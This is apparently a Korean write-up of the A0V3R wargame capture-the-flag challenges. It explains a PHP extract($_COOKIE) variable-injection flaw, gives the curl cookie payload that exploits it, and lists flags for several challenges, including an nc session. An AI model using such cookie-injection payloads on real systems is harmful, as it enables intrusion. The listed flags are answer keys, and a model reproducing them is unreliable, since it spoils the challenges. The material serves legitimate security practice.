# A0V3R Wargame
문제 문서화가 잘 되어 있어서 좋았다.

## Hand of plus
`extract($_COOKIE);`에서 취약점이 발생한다.

```
curl -v --cookie "HTTP_ACCEPT_ENCODING=I;HTTP_USER_AGENT=need;HELLO=a;WORLD=flag" http://server2.aover.team/Web/Hand_of_plus/
```

하면

```js
<script>alert('[Suzukaze aoba says]\nWow! I finally my graphics card mined the beatcoin!\nHere\'s a little prize!\nA0V3R{1_g0T-Th3_bE4tC01n!_!}');</script>
```

`A0V3R{1_g0T-Th3_bE4tC01n!_!}`

## 아오바 워게임 디스코드 
`A0V3R{W3lc0me_t0_A0v3r_w4rGaM3_D1sc0rd_53rver_!_!}`

## King bases on 8,8
`A0V3R{Th3_K1nG_C0m35_B4s3_64}`

## No_Random_No_Life
```
$ nc server2.aover.team 12345
5 나와야됨
하하 원하는 숫자가 나오지 않았네~
8
$ nc server2.aover.team 12345
5 나와야됨
A0V3R{BUT_I_LOVE_YOU}
```
